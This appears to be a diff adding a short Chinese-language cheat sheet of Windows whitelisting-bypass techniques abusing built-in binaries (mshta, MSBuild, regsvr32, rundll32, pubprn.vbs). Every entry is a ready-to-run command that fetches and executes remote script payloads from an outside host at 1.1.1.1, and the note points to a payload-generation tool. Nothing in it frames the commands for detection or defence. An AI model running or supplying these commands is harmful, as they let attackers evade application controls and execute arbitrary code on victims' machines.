@@ -1,0 +1,18 @@
+1、利用mshta.exe
+mshta.exe  http://1.1.1.1/poc.hta
+
+2、利用msbuild.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe poc.xml
+
+3、利用regsvr32.exe
+regsvr32 /s /n /u /i:http://1.1.1.1/poc.sct scrobj.dll
+
+4、利用rundll32.exe
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://1.1.1.1/poc.sct");this.close()
+
+5、利用pubprn.vbs
+cscript.exe c:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://1.1.1.1/poc.sct
+
+其中poc.hta 、poc.xml、poc.sct都可以使用如下项目自动生成。
+
+https://github.com/GreatSCT/GreatSCT
